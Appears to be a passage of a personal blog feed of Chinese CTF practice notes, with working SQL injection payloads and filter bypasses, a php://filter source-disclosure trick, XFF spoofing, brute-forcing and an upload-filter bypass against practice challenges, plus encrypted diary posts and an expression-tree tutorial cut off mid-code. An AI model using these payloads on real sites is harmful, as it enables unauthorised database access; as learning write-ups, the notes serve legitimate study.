$dir=<span class="hljs-string">'0123456789abcdef'</span>;    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($dir);++$i)&#123;        $nkey=$key.$dir[$i];        $ans=<span class="hljs-string">''</span>;        <span class="hljs-keyword">for</span>($j=<span class="hljs-number">0</span>;$j&lt;strlen($tmp);++$j)&#123;            $ans.=$tmp[$j]^$nkey[$j];        &#125;        echo base64_encode($rnd.$ans).<span class="hljs-string">'&lt;/br&gt;'</span>;    &#125;&#125;getAns(<span class="hljs-string">'guest'</span>,<span class="hljs-string">'YnV6RhQdCx4a'</span>)?&gt;</code></pre><br>再到config.php爆破cookie就好了<br>注：每次下发得cookie不一样，cookie—key-cookie,但是按照key在encrypt和dectypt函数中的使用，应该是加了$rnd$再md5加密后才使用，并且并未用到key的第一位，不知道为什么可以互用，留个坑。</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>bugku20.09.05</title>
    <link href="/2020/09/05/bugku%E6%88%90%E7%BB%A9%E5%8D%95/"/>
    <url>/2020/09/05/bugku%E6%88%90%E7%BB%A9%E5%8D%95/</url>
    
    <content type="html"><![CDATA[<p>又是一脸懵逼的一天。。<br><a id="more"></a></p><hr><p>成绩单<br><img src="/2020/09/05/bugku%E6%88%90%E7%BB%A9%E5%8D%95/%E6%89%B9%E6%B3%A8%202020-09-05%20134633.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"><br>进去啥也没发现，查看源码没什么收获，看到表单自然就想着SQL注入。<br>正常的输入数字1、2、3都得到结果，尝试1’错误，再试1’—没用，加空格（1’— ）或者1’#正常返回，应该是MYSQL数据库。再尝试数字注入1+1结果返回结果和1一样，应该不是    按数字格式处理。<br>最后尝试注入查询结构。看查询返回的界面应该是有4列（姓名以及三门分数），尝试1’ order by 4#返回正常，再试1’ order by 5#没有返回，应该是四列。<br>最后用UNION联合注入，1’ union select null,null,null,null#依然只返回一行，重置union前面的查询，用’ union select 1,2,3,4#有返回。<br><img src="/2020/09/05/bugku%E6%88%90%E7%BB%A9%E5%8D%95/%E6%89%B9%E6%B3%A8%202020-09-05%20135806.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"><br>开始注入查询：<br><code>&#39; union select null,null,null,group_concat(table_name) from information_schema.tables where table_schema=database()#</code><br>得到两个table_name: fl4g,sc<br> <code>&#39; union select null,null,null,group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;#</code><br> 得到列名skctf_flag<br> <code>&#39; union select null,null,null,skctf_flag from fl4g#</code><br> 得到flag</p><hr><p>SQL(ichunqiu)<br>题目明确告诉flag在数据库里。<br>id=1’#没有回显，1#可以正常显示，0+1没有回显，用order by查结构显示inj code!,应该是过滤了关键字，用/**/注释依然没有显示，采用&lt;&gt;成功注入，最终在order by 4时没有回显。<br>union联合查询，依然用&lt;&gt;避开select,and等的过滤。发现联合查询的第二个返回结果可以显示<br>注入过程：</p><pre><code>1+union+se&lt;&gt;lect+1,database(),3#</code></pre><p>得到数据库名称sqli</p><pre><code>1+union+se&lt;&gt;lect+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema=%27sqli%27#</code></pre><p>   得到数据库表名info,users</p><pre><code>1+union+se&lt;&gt;lect+1,group_concat(column_name),3+from+information_schema.columns+where+table_name=%27info%27#</code></pre><p>得到列名id,title,flAg_T5ZNdrm</p><pre><code>1+union+se&lt;&gt;lect+1,flAg_T5ZNdrm,3+from+sqli.info#</code></pre><p>得到flag(用users得不到flag)</p><hr><p>以为SQL勉强入门了，结果。。</p><hr><p>SQLI<br>(i春秋好难)<br>进去啥也没有，看源代码找到login.php?id=1，进去后显示welcome admin~，似乎非常顺利。开始对id各种注入，发现完全行不通。怕不是假的admin…<br>转到index.php,结果发现出来的网页是b68a89d1c4a097a9d8631b3ac45e8979.php，查看bp的HTTP history，果然发现有个302的响应，进去看到<img src="/2020/09/05/bugku%E6%88%90%E7%BB%A9%E5%8D%95/%E6%89%B9%E6%B3%A8%202020-09-05%20224204.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"><br>看到l0gin.php?id=1进去。<br><img src="/2020/09/05/bugku%E6%88%90%E7%BB%A9%E5%8D%95/%E6%89%B9%E6%B3%A8%202020-09-05%20224326.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"><br>奇怪的注入，测试后得到的有用信息是过滤#和’,’以及两列(order by)，#用%23代替即可，’,’在union联合查询中会用，代替方法见<a href="https://drops.blbana.cc/2017/05/20/SQLi-%E2%80%94%E2%80%94-%E9%80%97%E5%8F%B7%EF%BC%8C%E7%A9%BA%E6%A0%BC%EF%BC%8C%E5%AD%97%E6%AE%B5%E5%90%8D%E8%BF%87%E6%BB%A4%E7%AA%81%E7%A0%B4/" target="_blank" rel="noopener">链接</a><br>注入过程：</p><p>  <code>0&#39;+union+select+*+from+(select+&#39;a&#39;)a+join+(select+database())b%23</code><br> 得到数据库名sqli</p><pre><code>0&#39;+union+select+*+from+(select+&#39;a&#39;)a+join+(select+group_concat(table_name)+from+information_schema.tables+where+table_schema=&#39;sqli&#39;)b%23</code></pre><p>得到数据表名users</p><pre><code>0&#39;+union+select+*+from+(select+&#39;a&#39;)a+join+(select+group_concat(column_name)+from+information_schema.columns+where+table_name=&#39;users&#39;)b%23</code></pre><p>得到列名id,username,flag_9c861b688330</p><pre><code>0&#39;+union+select+*+from+(select+&#39;a&#39;)a+join+(select+flag_9c861b688330+from+sqli.users)b%23</code></pre><p>  得到flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>bugku20.09.04</title>
    <link href="/2020/09/04/bugku%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/"/>
    <url>/2020/09/04/bugku%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91/</url>
    
    <content type="html"><![CDATA[<p>懒得上图，随便写几个题<br><a id="more"></a></p><hr><p>网站被黑<br>进去界面后没有找到提示，尝试burpsuit爬虫结果连续错误太多自动停止，改用爆破，得到shell.php（似乎许多后门都叫这个？），之后正常密码爆破就行。</p><hr><p>管理员系统<br>进去就是登录界面，看源码发现”dGVzdDEyMw== “的字符串，base64解码得到test123，猜测这是密码，账号用admin，结果出现“IP禁止访问，请联系本地管理员登陆，IP已被记录.”。<br>考虑用XFF伪装成本地登录（127.0.0.1）,成功得到flag。</p><hr><p>web4<br>提示看源代码，找到p1,p2两段像url编码的字符串，解码就好。</p><hr><p>flag在index里<br>不会做的一道题。。。<br>根据题目以及在点击”click me?no”后url中的file参数，联想到php://filter(完全没见过，无法联想。。)<br>php://filter是一种元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。简单来讲就是可以在执行代码前将代码换个方式读取出来，只是读取，不需要开启allow_url_include。</p><blockquote><p>参考文章：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p></blockquote><p>通过php://filter/read=convert.base64-encode/resource=./index.php得到index.php的base64编码后的显示，再解码即可得到index.php内容</p><hr><p>备份是个好习惯<br>显然，看到题目就知道要找.bak，进题后看到一串奇怪的字符串，md5解密得到空。下载index.php.bak，代码审计。<br>注意parse_str函数把查询字符串解析到变量中，比如?f=flag，则有变量$f=flag。<br>注意会过滤key，双写即可</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>百度杯九月场123-20.09.04</title>
    <link href="/2020/09/04/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88%E5%9C%BA123/"/>
    <url>/2020/09/04/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88%E5%9C%BA123/</url>
    
    <content type="html"><![CDATA[<p><img src="/2020/09/04/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88%E5%9C%BA123/%E6%89%B9%E6%B3%A8%202020-09-04%20134140.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"><br>进入链接，直接是登录界面，查看源码得知用户都在user.php里，密码是用户名+出生日期。<br>直接进user.php发现什么都没有，尝试下载备份文件user.php.bak，果然可以。得到用户名单后用burpsuit爆破。注意爆破技巧，选择多payload,对用户名自然用得到得user.php.bak文件，密码复制payload1加后缀，尝试原来index.php界面源码提示里的1995成功爆破登录。<br>登录后的界面还是什么都没，查看源码去掉form表单的注释显示处文件上传。起初以为是传一句话木马，结果提示只能传后缀.jpg,.png,.gif,.bmp的文件，改成上传jpg图片，结果发现还是不行，改成提示文件名不正确。到这之后一直卡了很久，在网上找wp发现上传.jpg.pht文件可以(pht文件是手机照片常用格式，知识实在匮乏)。<br>       成功上传文件后出现view链接，链接到view.php界面，显示”file?”,在url上加上?file=flag，得到filter”flag”，提示flag被过滤了，用双写避过过滤(flflagag)，得到flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf刷题笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入漏洞查找</title>
    <link href="/2020/09/02/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%9F%A5%E6%89%BE/"/>
    <url>/2020/09/02/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%9F%A5%E6%89%BE/</url>
    
    <content type="html"><![CDATA[<p>This typically involves:</p><ul><li>Submitting the single quote character  <code>&#39;</code>  and looking for errors or other anomalies.</li><li>Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.</li><li>Submitting Boolean conditions such as  <code>OR 1=1</code>  and  <code>OR 1=2, and</code>  looking for differences in the application’s responses.</li><li>Submitting payloads designed to trigger time delays when executed within an SQL query, and looking for differences in the time taken to respond.</li><li>Submitting OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitoring for any resulting interactions.</li></ul><hr><p>先试字符注入，再试数字注入，再注入查询结构，再联合查询等<br>对url注入时</p><ul><li>空格用%20或+代替</li><li>+用%2b代替</li><li>注意注释— 要加空格</li><li><h1 id="用-23代替"><a href="#用-23代替" class="headerlink" title="用%23代替"></a>用%23代替</h1>若是表单则可通过拦截查看是否需要如此</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2020/9/2</title>
    <link href="/2020/09/02/2020-9-2/"/>
    <url>/2020/09/02/2020-9-2/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="解不开吗，不如联系我？" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">虽然不是什么隐私，但是还是小小加密一下,不知道弱密码DES加密后强度怎么样呢（吐槽一下这个人DES加密结果和网上不一样，却偏偏可以成功解密）</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="ae51cea94eb74ac107048a8dff896d14a692393de65de13bd29da47d11e3cf4b">419ed73177d3ae255155b408a654c5f775c3985f92f21a7e4dc296a1373f10f1e80b0106a9ed47617ae3635df20c9a120b2e81fdb9f49c1fd5b524e377925aa63af8ecab6a62405d539778e63c42c261d860421c92b62a9d06226ecdf808edc165320f303fc600b5e01927706e97f05a6e0e89362bd8430fb1f81b0ccb71b79e4cbe74005caab5fa7e456d2870fd1441c1075000c6ddf9f4d947a37310d61862977420fadcedf44ceb6afc08283ff4f25d640cfe38834cd2712fe7acc90ca1b75dee19b0aca8a7a10efcdac3ad3c5376c73a03d963f55bdd50d9c99a6a291d07bd68b1bb04abb53911c299c14cea0442072f76c4ef2e5bf4630ad70b89903fbcae22f05a67c5fbca7041f85944efa85d3c538381b9d37856b186245635e86eeb8c45a7014b8c63944073734f4b12fab9253757420ad57f5e49ba6da8ea8b908ba55392447416c9868e6184bd8778e1925a1947825c1885ae9de1de78554019d594a5686034fdb47f13eb1bda9a42bd84c2fea3efe60a91a4d6d6b2fc78e50b103ea61ef0a8fb8424aebaddceadbb0e9b15d3e5ce99f8690303f2bfb6e4a6870bbe98310bcce504e4b6ee53d625b784bd2ae39227e020008e4b1656cf1e0c9f3995f8ffb5e6b0779732250742ac77b77b988202f065023eab6647d18f70c0703e9640196212547461e6827425f09e9ed453f8a735ac5de8686cf4e13fc9a295252c5cd76ce4520a4aaac79963dd0ec77fb73f207869c89e6a6c4d77366bde6dfdfff4f5373e75ef76a96582941e4549484e862fff2bcdd34022e9c01a9784f99710ac4f318b58b0bb941d685aa5578c939f8f57b0df2b5ffb82c7fa9de17862f9a204d1fb30fe0893cc3b0f50afb8a83db4e54ae7c7436a7af1532fe8db55d19a89bc2f6453f22121c1d8edb3309c69ea1e14e9bdf131b6bc23f900bb59c84d02f2b45830a17e24cda01a5ec92bc3cfaeabb1e322a4089d191a4f68eace25f2a9835b05908fa8718bc76c5f97d0c1707b2e66bf99f50a7046ab60df27a6503709299def22b35dbfe87645aa3ea99c6e6aa0408c92f27c15699f62940582abc536157ffe6ba50a8d6525f1df63aa8eb4bc6de449fd866801f8fcfe129cc04de797adb8465b037212b22b0f2c37ddd977e08dbc76762e14706040764ea50ece3a6a70a8047343718c7591f93c20f3bac1574a0a069711a52cd2cc23939ea978c89428e298e922521cacbe2da5e02e2ac250b4ff5c8d40fa104a89781ea3f339f189a74ac153b8bfb7a8282f15075f4cb56ada027b88b9dc3e118f4f23a490f89d4316691b69733b053bcf6239344f9dcbce6137e02cafac96021453ae9cc676afd66089102c0d3521a0ba9888c8b3b1a5fb4bd2014ca355f4a56d5c8551b5d6c91c15217c95032ec096f56b85cc3ee76add94d8779d2c201cdb5c17d0babb91ec58aea72c5f7fa88f23e3de66ee98d62cc771055939c2e8537af2b0244e7d6bc07717548ab50ba4c1633addcac2c3a738fb395a23117a35aab77971d240f2455633463c0cbffdb446738b94be6f120d6b6033299add0ba535c7f9a696dc6ab2ff5c3ad54fca6eef64ad2d6410425a339fff89d38a954c4b0d11da28e00c456867148820ccb869520604ba18e9486849c260109c8d9dac4c4343386df58af2b666285ab272c3c0faa2e9428163744268d416a4794ebd708703448992c4007fb17d16655c3f279b2bfd87770db70f67365dc756fe27c03c5604c261d2015ae1d6656480344c14f8860e30b461de8db01bb2b35c9a3c6a96f90818675cb17930d7e551f932a75bb8585de8af2ac22c311efdbfd8bf15390376a52bfd48c8e1199252c3124a1ee6729f4fcafda93f4a0c5a18fc7dedc38249d920e2b309abe16ed34ee9465ae02f9cbb442ce4218fa2a98c2dcbb7511b2f6fad2998cfdab79fc2dc6590bb57473813372ea84fa105df5cc934d67cfe8dedd26bccca79e18c2a69cd6c526db5efad7af253472e837f8ffead0f722e56209c797fc32d1f5c26bf7bd1d2eba0cc85b9aaa3416b0a965a5fb57608d72aab319d488604e10cade4d998833336c32d92bc8ac9d898acf25d6d3197634f2bda56d62ce8958570c0d1f330ae4c97</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>生活随笔</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>搬校区前的一些琐碎</title>
    <link href="/2020/08/31/%E6%90%AC%E6%A0%A1%E5%8C%BA%E5%89%8D%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%90%E7%A2%8E/"/>
    <url>/2020/08/31/%E6%90%AC%E6%A0%A1%E5%8C%BA%E5%89%8D%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%90%E7%A2%8E/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="解不开吗，不如联系我？" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">虽然不是什么隐私，但是还是小小加密一下,不知道弱密码DES加密后强度怎么样呢（吐槽一下这个人DES加密结果和网上不一样，却偏偏可以成功解密）</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="e609754732fcc4818923f1890eda43b074709fa08c03bd91e0f976d1752df821">baabba653fb61cfb0a3c404268df9a1f3129e52289c5685945a97bf4bda56f17f9a838de9299b866e97da4c85e713d326c38cc5ef96bffc43bf3095c07e884caa56626309e621b68178809e0583427da20ec6fbfec4fbaf5b4b937618f75de43f1c70a5d95eebd375c4075cfd4a43d220ea347bc8f462cacbd334fd279f91e379c10c41696013f625415ac55f425ba9185dc30cbc16c524d15ad588e52d257d9560a591f4572e2b61917cc1465d46d9f0193fdd07a6f5ea82975d3e53afa1daaa0b2b9f609066b10f62ec2ed905bcbfe0844ef3d124e8f8f67d57956d337a49bb93d4f8a02268121c4c043f3de7263dcb6c73d74ec53f21a3eb4358599d14dea0706e18d9bd0888550c90158a775dd93b7e5dfce54dbbfc64a9bdf4aa8a6e4adc6e6f73ad6efeb5f77f61b9d4b88693f996ae0435d145e26b8a836eb626965540a3a2d9985f6779e2bb7cd53c6290974b074d0fd99cd13e5af01a6a369d143f2da837577b871e41c0494eda7d1357a71e9779f60a8aa169bd20fc830a2c9d9f9b3b08be8a8d4f3e90199fe26356890c24526aa1cbba3d8b337e838deb4770a640f8407a1a7676626c8ca37c707cf3e662566741be6448d80b2574ccf8bae517c2d560219082b4dd8faf1e698df74fcc348d1d8a1234decc844c1a359608f36d1d0b6df05997ea05c4586cbd977e6842f120aa030ffdf000a39002ae69dd42c0766a62f9d649ff8d3a7b638aa428de403f80878b59099fba142239bd1027e7ede7f8f65c18553958b0958067ed3867c2025b49c15b5129cb5d968a1cda6bc308fe118a4b98c9c0edac783a630998364fb15c11bf62f1a665eaf7c152d02b235b362d9908f209b30c57818922ae222d1951d2149aa653f7962361ec559d4a9139340946efc5734d4b215b34e51fd2ad872ada92c4ba39809b26aedbb94521e421ffadc18ebc4e0ed4b2c33ca4bbfdc65d29f66fdab0bb767bdb936f5fbb540d142132ceaf9880827163940885c4fe782fd0372c3f1b68b135a775fee4e5c762914fe0401732c0154cea91f812e701e078446f4f2958af0ed81d7356edf2b9352255ddbabedc0a9adbcbbbc14997a32ef435ac71da38cd3d913ef3eb10e6de0b067583f493ddc112ee2681cb83126c0e3fb354b4c8542cf91293cec0414471d8dd43624ac6cf748e109f272a7cb9f150dd858dd86e6a8316713f95e1507a824d025582c34b816c04f48af30b8467a1a2fee6e883419b4ca06bcddc52a5c21ba51fd1cde43f300752128838ece9ebadc86fe7f037fa87a9307b8f721818613f4187f7ea722caae4d06b8b3f8807b3f3f8e57f4283cdde6a87042657c4aa1ee0ef472f744eeea879588c3632db73f26c74bbe39b17adc767a1e918ffc127b70070c19</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>生活随笔</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于网络环境的一点感慨</title>
    <link href="/2020/07/14/%E5%85%B3%E4%BA%8E%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%E7%9A%84%E4%B8%80%E7%82%B9%E6%84%9F%E6%85%A8/"/>
    <url>/2020/07/14/%E5%85%B3%E4%BA%8E%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%E7%9A%84%E4%B8%80%E7%82%B9%E6%84%9F%E6%85%A8/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="解不开吗，不如联系我？" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">虽然不是什么隐私，但是还是小小加密一下,不知道弱密码DES加密后强度怎么样呢（吐槽一下这个人DES加密结果和网上不一样，却偏偏可以成功解密）</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="fe9556d788a747239382b5994f906707f04057c0b1959af8968b2cc1010a28ee">ce96faccdeb21096f917cf9c40a63b341a282618a76c6bccc01af84d2d0d959fb66aa0963e27836b5052c169ff22e49381a0a7068a15d146e8c5c2c5f2899320a29e220e1e82a6a0f9a7e782a6f24ef51fe2652d76775976fe3c860d6ce25a57ffbdd7acd7e79db284375f7acefd84650008c6277860ea04287d6fd529bc819f36c9f194eaab91c10a00280d445b9f09c93c73d1765b6d7c17f928d153edeb022a769230bb20910df239e1efbdde68c43cb43aba1f1d9f2783e289fb643bed1eec96eee9500cc1992c4303b96d775240a6a064d272b8f3333d38ab0dd1a5542e823c61411b5312cb9cdcdbc0f353709835cc1a9c54110c1e4a61f496b0d89e034507c438c5e60cecede22d5f6c47db5c51cf4cce4a17eece099022103dc66e1aa96d25d26ebdf0c81f86130c154c4c48fafbebc1617740ac43eb02b1fd4e5c6e93a252a80fe451a23fd67324527a549ea30e97ce3919ed22fda7d3336594289c02e2c08d5af7e1e13703db2af7b2a95afe14fcdece0ddac47243f385509aa5426242ac0f7ad119a670fbc9863b9e3ac4ac837ba6055e17cf4f653da2ef58a110cd18c8a5afb67bc8628004720dde1e146b290399068c8a40e494154d61f268533940dea4b63adebd08ea26b47acc81adbe68869d0e4a046d0a9a5c3bdb04a672233518490090e92429aaf108f3a85103c9a36018197b72b2c7d84f2fe6fa80f8c2ace3413da28fd309e6e39f377d76d4ad1ce18090336f4450bd89f2b9ca9dd1994c88f332f2e0a7f27b8cf99d3ea8244fdbedc399931447ad884d2f700af76a1458b538897d6d00a1352396467ed1af9c492c382c9a5bb64987bf6e9b3d881427f7f483cd7b7b2de590af0c480689c778c4ad62838998d52ec6373df925f8bba3cac083ee23308ccfae832356a5eb80eb8188a48955ce65b5955d999ffebb2f4dfd2a32af8d518b3a44d99c145f8d2403d866ee46dcaf15d7a87493bfc0b01a087bb8ca3f6d986cf1f3fbe2b0f9d8ec714828aad560b5841874fccdaa85890d22bae55b2191f9889ef6a1567d754131456169ca4a10f6677ee753f93415125f5e01b9f1b2fe6ba08978f61aae0cb2ff3a061a4f1b7231098d93e8de5bf5ce2c50536e3e98da40e068a7c13f93ce67bc22c5f8c3cef0665099a19de8b3d562bfba6d940043f8776ac43d6da0614cc6655b1044d14201b63184b6a0f824f68b204b1780954f22f7c80c6f73df660d90d75c08a3244ffebbbda8b5dfea198ff88d00e2e8dd59ebd3f3d701f0171567b92b7635daa5785915faeb6c51a294904b1c384530d3eb2ee20808e0d2d5914611c83743060abf5f4fc3f023dac041f24d265c44359024a2ba1005e13b9ecead790310698fc2b244a9f2fac382c481386906f77ef7e491fff01bb7d90c08e0a0c8760eae0156d4238587bb9f7a98c90c41545c02b0cb20a08e7b6322e0e23e05f216f2995d4275b29140e0ec6d8bd94b7cde924a7da9bd201110ab6225b0c7f275fc935aa461348ce1cc638b55eb8437ff1efced98470efd0b1f0e184482b3a12d95cb1c7fdef0db6c36d8a3f13960eb61a5baf25454da3fe22d29f47f93dcc315900c67341ed95805dd8156e52dd4c22dccf4de1ebdb2aa3703bee87dca2b85cb145e27ab0d75686a3b8311db5e350b3fa45b4b035f21488c07ea7ff51c6cbf503e4ad61f2f988a999889ef2cc6d6952b5dbbe988daabf822b34eb451d5c29730b41137e20f6071cef6e19536f11827a71356115aafdf5810cf46c53688c900d10c3f4b3952cc13c6486a31467f5433ad089a68e1f4edf1504c03a2cb625488bf743753c51c89bd428f17791f86cc6611949c51d769f012e3e0a106f3806a2b587fc6dd196f11e8cd3392f9be0a8fba9fff7cf386175323e2b0200e87a6c9692ab4487cebf11351934e464a2616ea29be13a367e72240684df6e434a8be47023072c54f534c5ff70330d76a8c2a46cc1001e13300f56738cc8bb3fae352cb300ab00a85f07d3f616f0f54d6169db5700e1239caf053c3db712f52e850780a55298c3c65a48786cae8e9b4a74af74b9415de8b99da10b20c447b39c92141e54a4e595bdc70353118c8f7629631a2252a2cbb2e33bd2f32c937fcd7c0829bc31b0a78965b30536765d9094ab89719d80cd86ffd1b691d8d74c569887c5d70c888281162aef8dd383cd775b65292e6da1075b83a2f453d69764668770b1043fc686a2305f7cbd88d087640fe7575224103e1a5f0c5bc688f4843780aaf4d2396a04c4c98d435a0ed8d076b3b5ec649326748d49e1e96f663702146cbc01d5119aeaa7bea38bd2239030bb684b4e573140d52d69927608b912296c56f07d1283d2f46ffce18ebab76108abd2e8aafa6956381f414ffc84fea0140ea36ac2a9c35cd3cda75c0bb396f8b62d4533a07a1713315565e4b94d37457cc4e368b9d77f84333ceaa8e64bd8c9b58242521dba562299576a12f91034d6e1d0731db0c2a360bedd7c2c8a8188efc0a5eac5cf3068d71ee54e842810177b3545b26d62a38254a44d23b4f1b177aa43809732c16eba8c4802c9bda9c4140cebd843e768841c1b66eb3eac1ef57a669ec29849750d28e212695dfaf56beb4be357df8e6699c06d719229be4ab28334e8dcd84aab073208827e63a101f4be977ff33f453717ebd13abe2aa333625400bc81b79a76e2299db1e0081e92e0b19d07944d77130f3570e27e0</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>生活随笔</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>表达式计算</title>
    <link href="/2020/06/18/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AE%A1%E7%AE%97/"/>
    <url>/2020/06/18/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AE%A1%E7%AE%97/</url>
    
    <content type="html"><![CDATA[<p>关于中缀表达式，后缀表达式以及表达式树。<br><a id="more"></a></p><hr><p>中缀表达式计算：<br>step:</p><ul><li>建立两个栈分别存储运算符与数字</li><li>入栈，运算符入栈时若需出栈直接与数字进行计算，结果入数字栈</li><li>清空运算符栈得结果</li></ul><hr><p>后缀表达式计算：<br>step:</p><ul><li>建数字栈</li><li>遇到运算符出栈计算，结果入栈</li></ul><hr><p>中缀表达式转表达式树：<br>step:</p><ul><li>建立两个栈存储运算符与树结点</li><li>遇到数字建立结点入树结点栈</li><li>遇到运算符入运算符栈，若需出栈则出栈运算符建立结点并与结点栈两结点连接，连接得到结点入结点栈</li><li>清空运算符栈</li></ul><hr><p>后缀表达式转表达式树：<br>step:</p><ul><li>建立树节点栈</li><li>遇到数字建立结点入栈</li><li>遇到运算符建立结点并与栈顶两结点连接，连接结果入栈</li></ul><hr><p>表达式树转后缀表达式：<br>step:</p><ul><li>后序编历</li></ul><hr><p>表达式树转中缀表达式：<br>step:</p><ul><li>中序遍历，注意添加括号<ul><li>如果根节点是+号，那么无论左子树以及右子树是什么操作符，它们都是不需要加括号的，因为根节点+号是最小优先级的</li><li>如果根节点是-号，那么只有右子树是+号或者-号时，右子树才需要加括号</li><li>如果根节点是*号，那么只有左子树或右子树是+号或者-号时，它们才需要加括号</li><li>如果根节点是/号，那么如果左子树或右子树是+号或者-号时，它们需要加括号，其次，如果右子树是*号或者/号时，右子树也需要加括号<pre><code class="hljs xl">void dfs(bt* q)&#123;<span class="hljs-keyword">if</span>(q == NULL)return;<span class="hljs-keyword">else</span>&#123;<span class="hljs-function"><span class="hljs-title">if</span>(q-&gt;</span>op == <span class="hljs-string">'+'</span>)&#123;<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>lchild);<span class="hljs-function"><span class="hljs-title">printf</span>("%c",q-&gt;</span>op);<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>rchild);&#125;<span class="hljs-function"><span class="hljs-title">else</span> <span class="hljs-keyword">if</span>(q-&gt;</span>op == <span class="hljs-string">'-'</span>)&#123;<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>lchild);<span class="hljs-function"><span class="hljs-title">printf</span>("%c",q-&gt;</span>op);<span class="hljs-function"><span class="hljs-title">if</span>(q-&gt;</span><span class="hljs-function"><span class="hljs-title">rchild</span>!=NULL&amp;&amp;(q-&gt;</span><span class="hljs-function"><span class="hljs-title">rchild</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">op</span>=='+'||q-&gt;</span><span class="hljs-function"><span class="hljs-title">rchild</span>-&gt;</span>op==<span class="hljs-string">'-'</span>))&#123;printf(<span class="hljs-string">"("</span>);<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>rchild);printf(<span class="hljs-string">")"</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>rchild);&#125;&#125;<span class="hljs-function"><span class="hljs-title">else</span> <span class="hljs-keyword">if</span>(q-&gt;</span>op == <span class="hljs-string">'*'</span>)&#123;<span class="hljs-function"><span class="hljs-title">if</span>(q-&gt;</span><span class="hljs-function"><span class="hljs-title">lchild</span>!=NULL&amp;&amp;(q-&gt;</span><span class="hljs-function"><span class="hljs-title">lchild</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">op</span>=='+'||q-&gt;</span><span class="hljs-function"><span class="hljs-title">lchild</span>-&gt;</span>op==<span class="hljs-string">'-'</span>))&#123;printf(<span class="hljs-string">"("</span>);<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>lchild);printf(<span class="hljs-string">")"</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-function"><span class="hljs-title">dfs</span>(q-&gt;</span>lchild);&#125;<span class="hljs-function"><span class="hljs-title">printf</span>("%c",q-&gt;</span>op);<span class="hljs-function"><span class="hljs-title">if</span>(q-&gt;</span><span class="hljs-function"><span class="hljs-title">rchild</span>!=NULL&amp;&amp;(q-&gt;</span><span class="hljs-function"><span 